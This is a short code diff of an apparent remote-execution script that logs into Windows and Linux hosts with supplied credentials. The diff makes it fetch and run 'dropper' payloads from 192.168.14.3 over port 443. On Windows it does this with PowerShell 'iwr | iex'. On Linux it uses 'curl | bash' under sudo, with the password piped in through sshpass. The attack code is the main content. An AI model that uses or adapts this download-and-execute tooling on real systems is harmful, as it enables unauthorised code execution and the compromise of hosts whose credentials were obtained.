@@ -49,15 +49,14 @@ def create_linux_session(host, username, password):
 
 
 def windows_execute(session):
-    ps_script = 'iwr http://192.168.14.3/download/dropper.ps1 | iex'
-    ps_script = "whoami"
+    ps_script = "iwr http://192.168.14.3:443/dropper.ps1 | iex"
     output = session.run_cmd(f'powershell -c "{ps_script}"')
     print(output.std_out.decode())
 
 def linux_execute(username, password, host):
     # stdin, stdout, stderr = session.exec_command("curl http://192.168.14.3/download/dropper.sh | bash")
     # replace command with command to run, it gets run as sudo
-    command = "curl -s http://192.168.1.51:443/dropper.sh|bash"
+    command = "curl -s http://192.168.14.3:443/dropper.sh|bash"
     output = subprocess.run(f"SSHPASS={password} sshpass -e ssh -t {username}@{host} 'echo \"{password}\" | sudo -S {command}'", capture_output=True, text=True, shell=True)
 
     print(f"Output: {output.stdout.split(f'[sudo] password for {username}:')[1].strip()}")
